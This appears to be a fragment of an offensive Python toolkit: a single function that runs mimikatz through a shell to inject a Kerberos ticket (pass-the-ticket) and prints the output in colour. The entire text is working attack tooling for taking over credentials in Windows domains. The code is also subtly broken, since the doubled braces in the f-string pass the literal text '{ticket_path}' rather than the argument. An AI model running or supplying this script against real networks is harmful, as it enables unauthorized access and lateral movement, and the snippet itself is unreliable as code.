import subprocess
from colorama import Fore

def pass_the_ticket(ticket_path):
    print(Fore.YELLOW + "[*] Injecting Kerberos ticket using mimikatz (requires mimikatz.exe in PATH)...")
    cmd = f'mimikatz.exe \"kerberos::ptt {{ticket_path}}\" exit'
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
        print(Fore.CYAN + output)
    except subprocess.CalledProcessError as e:
        print(Fore.RED + "Error:", e.output)
